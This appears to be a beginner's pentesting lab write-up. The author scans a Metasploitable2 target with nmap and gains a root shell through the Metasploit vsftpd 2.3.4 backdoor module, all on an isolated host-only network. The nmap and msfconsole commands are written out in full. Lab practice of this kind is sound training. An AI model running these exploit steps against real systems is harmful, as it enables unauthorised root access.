# 🛠️ Penetration Testing Lab — First Exploit

This was my first full penetration testing run inside a controlled lab.  
I wanted to get hands-on with scanning, identifying vulnerable services, and running an actual exploit against a known-vulnerable machine.

---

## 🎯 Goal

- Build a safe pentesting environment.
- Practice basic recon (Nmap).
- Use Metasploit to exploit a real service vulnerability.
- Confirm remote shell access on the target machine.

---

## 🧱 Lab Setup

**Tools Used**
- Kali Linux (attacker)
- Metasploitable2 (target)
- VirtualBox (Host-Only network)
- Nmap
- Metasploit Framework

**Network Layout**
- Kali and Metasploitable2 both on a **Host-Only Adapter**
- Target (Metasploitable2) set to:192.168.56.101

This keeps the entire attack environment isolated from the rest of my network.

---

## 🔎 Reconnaissance

Scanned the target from Kali to see what was open and running:

```bash
nmap -sV 192.168.56.101
This exposed several services, including:

FTP: vsftpd 2.3.4 (this is the vulnerable one)
SSH
Telnet
HTTP
SMB
MySQL / PostgreSQL
IRC (UnrealIRCd)
The FTP service stood out because vsftpd 2.3.4 is known to contain a backdoor vulnerability.

💥 Exploitation (Metasploit)

Started Metasploit:

msfconsole

Loaded the exploit module for the vsftpd backdoor:

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run

Result:

Found shell.
Command shell session 1 opened.
Once the shell was active, I checked the user:

whoami

It returned:
root
Full system compromise.

🧠 Outcome

Successfully scanned and identified vulnerable services.
Verified vsftpd 2.3.4 as the entry point.
Exploited the FTP backdoor using Metasploit.
Gained a root shell on Metasploitable2.
Confirmed the entire lab network and tooling is working as expected.
